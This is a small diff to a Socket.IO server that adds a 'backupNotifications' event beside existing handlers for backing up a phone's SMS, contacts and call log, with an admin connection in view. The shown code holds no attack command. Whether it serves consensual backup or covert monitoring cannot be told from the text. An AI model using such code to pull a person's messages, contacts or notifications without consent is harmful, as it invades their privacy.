@@ -48,6 +48,8 @@ io.on('connection', (socket) => {
       socket.on('backupSMS', () => handleBackupInitiation(socket, 'backupSMS', 'SMS'));
       socket.on('backupContacts', () => handleBackupInitiation(socket, 'backupContacts', 'Contacts'));
       socket.on('backupCallLog', () => handleBackupInitiation(socket, 'backupCallLog', 'Call Log'));
+      socket.on('backupNotifications', () => handleBackupInitiation(socket, 'backupNotifications', 'Notifications'));
+
      
       socket.on('disconnect', () => {
         if(socket.id===adminSocketId){
